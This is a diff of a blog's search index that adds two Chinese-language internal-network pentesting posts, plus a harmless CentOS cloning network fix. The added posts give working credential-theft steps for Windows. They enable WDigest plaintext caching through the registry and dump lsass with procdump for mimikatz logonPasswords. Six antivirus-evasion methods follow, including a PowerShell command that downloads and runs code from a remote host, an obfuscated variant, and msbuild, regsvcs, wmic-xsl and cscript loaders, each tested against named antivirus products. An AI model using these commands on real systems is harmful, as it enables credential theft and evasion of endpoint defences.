@@ -1,6 +1,34 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Windows10明文密码抓取]]></title>
+    <url>%2Fposts%2Fb500df40.html%2F</url>
+    <content type="text"><![CDATA[桃李春风一杯酒，江湖夜雨十年灯 在默认情况下，当系统为win10时，系统默认在内存缓存中是禁止保存明文密码，所以要想使用mimikatz抓取明文账号密码，还得重新配置注册表并重登系统才能抓取明文。procdump+mimikatz获取win10用户明文密码测试环境：Win10 企业版LTSC 1809工具下载：k8版本的mz64.exe、procdumpv9.0原理：获取到内存文件lsass.exe进程(它用于本地安全和登陆策略)中存储的明文登录密码利用前提：拿到了admin权限的cmd，管理员用密码登录机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中抓取明文：修改注册表，等待系统重新登录，截取dmp文件先修改注册表1reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 修改完之后，重新登录账号，此时抓出来的密码就是明文显示。 在默认情况下，当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，如下图，密码字段显示为null，此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。重登系统后，抓取dmp文件管理员权限运行1procdump64.exe -accepteula -ma lsass.exe 1.dmp也可以在任务管理器中导出文件，这里需要注意AppData隐藏文件夹把dmp文件导出到本地使用mimikatz读取密码 我这里是直接在机器上运行mimikatz读取密码了，在实际运用中一般会导出到本地再读取密码，这样才能躲避杀软检测流量特征。对了，这里需要注意的是，一开始我是用官方2.2.0、2.1.1版本的mz通通报错，google发现这应该是跟mz版本还有win10版本有关。1mz64.exe "sekurlsa::minidump 1.dmp" "sekurlsa::logonPasswords full" exit这里我用了k8的mz才没有报错，成功读出win10的明文密码]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>mimikatz</tag>
+        <tag>内网渗透</tag>
+        <tag>Windows</tag>
+        <tag>密码抓取</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[几种姿势运行mimikatz]]></title>
+    <url>%2Fposts%2Fb80a3101.html%2F</url>
+    <content type="text"><![CDATA[醉后不知天在水，满船清梦压星河 [Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)是一款能够从Windows认证(LSASS)的进程中获取内存，并且获取明文密码和NTLM哈希值的神器，内网渗透中常用mimikatz获取明文密码或者获取hash值来漫游内网。但是在实际的运用中，常常会遇到杀软的拦截，所以这里我借鉴网上的资料，进行复现学习，达到免杀绕过的目的。有些方式没有复现成功我就没有写出来了，有一些成功之后似乎也会被拦截了。姿势一：powershell1https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1cmd下执行，360没有拦截1powershell -exec bypass "import-module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz"powershell运行会被拦截1powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.30.139/Invoke-Mimikatz.ps1');Invoke-Mimikatz简单混淆还是被拦截了1powershell -c " ('IEX '+'(Ne'+'w-O'+'bject Ne'+'t.W'+'ebClien'+'t).Do'+'wnloadS'+'trin'+'g'+'('+'1vchttp://'+'192.168.30'+'.139/'+'Inv'+'oke-Mimik'+'a'+'tz.'+'ps11v'+'c)'+';'+'I'+'nvoke-Mimika'+'tz').REplaCE('1vc',[STRing][CHAR]39)|IeX"姿势二：使用.net2.0免杀mimikatz首先下载katz.cs，并放在对应的系统版本的Framework目录中1232位：C:\Windows\Microsoft.NET\Framework\v2.0.5072764位：C:\Windows\Microsoft.NET\Framework64\v2.0.50727然后在powershell中执行命令生成key.snk123$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='$Content = [System.Convert]::FromBase64String($key)Set-Content key.snk -Value $Content -Encoding Byte最后生成mimikatz，再运行32位：1C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\regsvcs.exe katz.exe64位：1C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;.\regsvcs.exe katz.exe很不幸，又被360发现了然而，火绒又过了，没有一点提示姿势三：js加载mimikatz下载katz.js，执行1cscript mimikatz.js360拦截，但是火绒过了，没有反应姿势四：.net4.0加载mimikatz下载mimikatz.xml，执行12cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319msbuild.exe mimikatz.xml过360，并没有拦截火绒同样没报姿势五：Jscript的xsl版下载mimikatz.xsl本地加载1wmic os get /format:"mimikatz.xsl"360、火绒都没有拦截姿势六：导出lsass进程离线读取密码mimikatz+procdump下载prodump，管理员权限运行1procdump64.exe -accepteula -ma lsass.exe 1.dmp也可以在任务管理器中导出文件然后把dmp文件导出到本地使用mimikatz读取密码1mz64.exe "sekurlsa::minidump 1.dmp" "sekurlsa::logonPasswords full" exit这里需要注意的是win10下的密码抓取方式是不太一样的，具体看另一篇文章：Windows10明文密码抓取。win7下拿到dmp文件后，就可以导出读取明文密码。]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>mimikatz</tag>
+        <tag>内网渗透</tag>
+        <tag>Windows</tag>
+        <tag>密码抓取</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Centos7虚拟机克隆的网络问题]]></title>
     <url>%2Fposts%2F2e7f84f8.html%2F</url>
     <content type="text"><![CDATA[壮心未与年俱老，死去犹能作鬼雄 今天克隆了centos7虚拟机，打开却发现一直没有网卡信息，后来才想起克隆会造成网卡信息的冲突，得手动进行修改才能获取ip，所以记录一下避免以后重走老路浪费时间。遇到的问题打开克隆好的虚拟机，查看网卡信息发现没有IP，对了，我这里的虚拟机是双网卡解决方法1、进入/etc/udev/rules.d/这个目录，删除文件70-persistent-ipoib.rules12[root@Centos ~]# cd /etc/udev/rules.d/[root@Centos rules.d]# rm -f 70-persistent-ipoib.rules2、修改网卡配置文件/etc/sysconfig/network-scripts/ifcfg-ens33，这里具体看大家的网卡名字，我的是ens33删除UUID这一行，因为每张网卡的mac地址是不一样的，所以UUID也是不一样的修改HWADDR为虚拟机克隆后的MAC地址 ip addr可以看到mac地址，但是还没修改网卡配置信息之前，这里是不能看到具体的ens33、37显示，只能看到类似于下方显示的virbr0名字3、然后如法炮制，copy一份修改好的ens33配置文件，修改为另外一块网卡正确的mac地址1[root@Centos network-scripts]# cp ifcfg-ens33 ifcfg-ens37我这里看到的名字是ens37，所以我得复制为ens37，然后再修改相应的mac和name4、最后重启一下网络服务，再检查一下IP信息就ok了1[root@Centos ~]# systemctl restart network.service注意如果启动网络服务时出现Device eno16884287 does not seem to be present错误修改网卡配置文件/etc/sysconfig/network-scripts/ifcfg-eno16884287, 修改Device和Name的名称， 如修改为“eth33”；确认网卡配置文件中“HWADDR”虚拟机的MAC地址是否正确；将网卡配置文件名重命名为/etc/sysconfig/network-scripts/ifcfg-eth33。1[root@Centos network-scripts]# mv ifcfg-eno16884287 ifcfg-eth33如果启动网络服务时出现Error, some other host already use address错误出现该错误说明同一个网段中有主机已经占用该虚拟主机配置的IP地址， 需要重新配置一个尚未使用的IP地址。]]></content>
@@ -8,8 +36,8 @@
         <category>问题解决</category>
       </categories>
       <tags>
-        <tag>Centos7</tag>
         <tag>网卡</tag>
+        <tag>Centos7</tag>
         <tag>克隆</tag>
       </tags>
   </entry>
@@ -21,8 +49,8 @@
         <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>OSSEC</tag>
         <tag>Centos7</tag>
+        <tag>OSSEC</tag>
       </tags>
   </entry>
   <entry>
